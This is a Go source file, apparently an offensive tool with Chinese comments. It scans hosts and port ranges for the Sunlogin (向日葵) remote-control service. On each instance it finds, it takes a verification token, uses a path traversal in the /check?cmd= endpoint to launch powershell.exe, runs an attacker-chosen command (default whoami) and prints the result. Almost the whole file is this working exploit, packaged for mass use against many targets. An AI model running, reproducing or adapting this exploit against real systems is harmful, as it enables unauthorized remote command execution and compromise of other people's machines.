package main

import (
	"bufio"
	"crypto/tls"
	"errors"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/go-resty/resty/v2"
	"github.com/tidwall/gjson"
)

var urllist []string

//执行命令
func RunCmd(port string, url string, c chan string, wgscan *sync.WaitGroup, cmd string) {
	client := resty.New().SetTimeout(3 * time.Second).SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true}) //忽略https证书错误，设置超时时间
	respa, err := client.R().EnableTrace().Get("http://" + url + ":" + port + "/cgi-bin/rpc?action=verify-haras")
	if err != nil {
	}
	str := respa.Body()
	body := string(str)
	//fmt.Println(cmd)
	verify := fmt.Sprintf("%s", gjson.Get(body, "verify_string"))
	client.Header.Set("Cookie", "CID="+verify)
	cmd_f := strings.Replace(cmd, " ", "%20", -1)
	resp, err := client.R().EnableTrace().Get("http://" + url + ":" + port + "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+" + cmd_f)
	if err != nil {
		//log.Println(err)
	}
	stra := resp.Body()
	bodya := string(stra)
	c <- ("[+]" + bodya)
	wgscan.Done()
}

//向日葵rce
func GetWebInfo(port string, url string, c chan string, wgscan *sync.WaitGroup, cmd string) { //获取指纹特征
	client := resty.New().SetTimeout(3 * time.Second).SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true}) //忽略https证书错误，设置超时时间
	rsps, err := client.R().EnableTrace().Get("http://" + url + ":" + port)
	if err == nil {
		str := rsps.Body()
		body := string(str)
		if strings.Contains(string(body), "Verification") {
			c <- ("[+]" + url + ":" + port + "\t可能存在向日葵rce!")
			RunCmd(port, url, c, wgscan, cmd)
			//fmt.Println(url + "\t" + port + "\t可能存在Rce!端口")
		} else {
			wgscan.Done()
		}
	} else {
		wgscan.Done()
	}
}

//扫描请求
func httpres(url string, port int, c chan string, wgscan *sync.WaitGroup, cmd string) {
	//参数1，扫描使用的协议，参数2，IP+端口号，参数3，设置连接超时的时间
	_, err := net.DialTimeout("tcp", url+":"+strconv.Itoa(port), time.Second)
	if err == nil {
		//c <- (url + "\t" + strconv.Itoa(port))
		GetWebInfo(strconv.Itoa(port), url, c, wgscan, cmd)
	} else {
		wgscan.Done()
	}
}

//文本读取成ip
func fileread(filename string) {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Println("open file err:", err.Error())
		return
	}
	defer file.Close()
	r := bufio.NewReader(file) //建立缓冲区，把文件内容放到缓冲区中
	for {
		// 分行读取文件  ReadLine返回单个行，不包括行尾字节(\n  或 \r\n)
		data, _, err := r.ReadLine()
		if err == io.EOF {
			break
		}
		if err != nil {
			fmt.Println("read err", err.Error())
			break
		}
		// 打印出内容
		//fmt.Printf("%v", string(data))
		urllist = append(urllist, string(data))
	}
}

//获取所有端口
func getAllPort(port *string) ([]int, error) {
	var ports []int
	//处理 ","号 如 80,81,88 或 80,88-100
	portArr := strings.Split(strings.Trim(*port, ","), ",")
	for _, v := range portArr {
		portArr2 := strings.Split(strings.Trim(v, "-"), "-")
		startPort, err := filterPort(portArr2[0])
		if err != nil {
			continue
		}
		//第一个端口先添加
		ports = append(ports, startPort)
		if len(portArr2) > 1 {
			//添加第一个后面的所有端口
			endPort, _ := filterPort(portArr2[1])
			if endPort > startPort {
				for i := 1; i <= endPort-startPort; i++ {
					ports = append(ports, startPort+i)
				}
			}
		}
	}
	//去重复
	ports = arrayUnique(ports)

	return ports, nil
}

//端口合法性过滤
func filterPort(str string) (int, error) {
	port, err := strconv.Atoi(str)
	if err != nil {
		return 0, err
	}
	if port < 1 || port > 65535 {
		return 0, errors.New("端口号范围超出")
	}
	return port, nil
}

//数组去重
func arrayUnique(arr []int) []int {
	var newArr []int
	for i := 0; i < len(arr); i++ {
		repeat := false
		for j := i + 1; j < len(arr); j++ {
			if arr[i] == arr[j] {
				repeat = true
				break
			}
		}
		if !repeat {
			newArr = append(newArr, arr[i])
		}
	}
	return newArr
}

func main() {
	ip := flag.String("u", "", "ip or url")
	file := flag.String("r", "", "url list file")
	ports := flag.String("p", "40000-60000", "端口号范围,默认40000-50000 例如:-p=80,81,88-1000")
	cmd := flag.String("c", "whoami", "需要执行的命令，默认whoami")
	flag.Parse()
	var wg sync.WaitGroup
	portall, _ := getAllPort(ports)
	c := make(chan string, 500) //通道定义
	start := time.Now()
	if *ip != "" {
		urllist = append(urllist, *ip)
		wg.Add(len(portall)) //计数器，只有带那个计数器为0才执行某个操作
		/*
			遍历url数组进行扫描
		*/
		for i := range urllist {
			for a := range portall {
				go func(url string, port int) {
					httpres(url, port, c, &wg, *cmd)
				}(urllist[i], portall[a])
			}
		}
		go func() {
			wg.Wait() //计数器等待，为0即关闭通道
			close(c)
		}()
		for i := range c {
			fmt.Println(i)
		}
		end := time.Since(start)
		fmt.Println("花费时间为:", end)
	}
	if *file != "" {
		fileread(*file)
		wg.Add(len(portall) * len(urllist)) //计数器，只有带那个计数器为0才执行某个操作
		/*
			遍历url数组进行扫描
		*/
		for i := range urllist {
			for a := range portall {
				go func(url string, port int) {
					httpres(url, port, c, &wg, *cmd)
				}(urllist[i], portall[a])
			}
		}
		go func() {
			wg.Wait() //计数器等待，为0即关闭通道
			close(c)
		}()
		for i := range c {
			fmt.Println(i)
		}
		end := time.Since(start)
		fmt.Println("花费时间为:", end)
	}
	if *file == "" && *ip == "" {
		flag.Usage()
	}
}
